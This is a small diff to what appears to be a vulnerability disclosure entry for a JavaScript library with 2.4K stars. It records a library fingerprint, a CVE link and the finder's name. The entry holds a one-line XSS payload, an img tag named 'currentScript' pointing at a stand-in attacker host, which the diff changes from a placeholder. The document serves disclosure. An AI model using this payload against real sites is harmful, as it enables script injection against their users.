@@ -6,10 +6,10 @@
 + Stars: 2.4K
 + Version: 0.8.10
 + Fingerprint: `typeof Stage !== 'undefined' && typeof Stage.create === 'function'`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://attack.hulk"></img>```
 + Impact: XSS
 + Status: Reported
-+ CVE: CVE-2024-53386
++ CVE: [CVE-2024-53386](https://nvd.nist.gov/vuln/detail/CVE-2024-53386)
 + Foundby: TheHulk
 
 ### Library
